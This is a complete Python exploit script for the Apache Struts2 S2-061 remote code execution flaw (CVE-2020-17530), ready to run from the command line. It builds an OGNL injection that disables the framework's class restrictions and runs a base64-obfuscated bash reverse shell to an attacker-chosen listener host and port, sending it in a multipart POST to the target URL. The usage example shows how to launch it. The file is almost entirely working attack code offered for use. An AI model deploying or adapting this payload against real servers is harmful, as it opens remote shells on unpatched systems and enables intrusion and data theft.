# encoding=utf-8，python3
import requests
import base64
import argparse
# import logging
# from http.client import HTTPConnection


def Target(url,ip,port):
    base_cmd = "bash -i >& /dev/tcp/"+str(ip)+"/"+str(port)+" 0>&1"
    base_cmd_byte=base_cmd.encode()
    mid_cmd = base64.b64encode(base_cmd_byte)
    final_cmd = "bash -c {echo,"+mid_cmd.decode()+"}|{base64,-d}|{bash,-i}"
    payload='''
    ------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name="id"\r\n\r\n%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("'''+final_cmd+'''")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--'''

    headers={
        'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36'
    }
    tturl=url
    print(tturl)
    requests.post(tturl,data=payload,headers=headers)
    # HTTPConnection.debuglevel = 1
    # logging.basicConfig()  # 初始化 logging，否则不会看到任何 requests 的输出。
    # logging.getLogger().setLevel(logging.DEBUG)
    # requests_log = logging.getLogger("requests.packages.urllib3")
    # requests_log.setLevel(logging.DEBUG)
    # requests_log.propagate = True
    # a=requests.post(tturl,data=payload,headers=headers)
    # print(a.request.body.encode())查看body内容差异


if __name__=='__main__':
    HelpMessage = argparse.ArgumentParser(description="S2-061 RCE && CVE-2020-17530", epilog='''
       Example:
       S2-061-shell.py -u http://127.0.0.1:8080  -r 10.0.0.1 -p 3306 
       ''')
    HelpMessage.add_argument('-r', '--remotehost',  help='remote listen host')
    HelpMessage.add_argument('-p', '--port',help='remote listen port')
    HelpMessage.add_argument('-u', '--url',help='target url')
    args = HelpMessage.parse_args()
    url = args.url
    ip = args.remotehost
    port = args.port
    Target(url,ip,port)

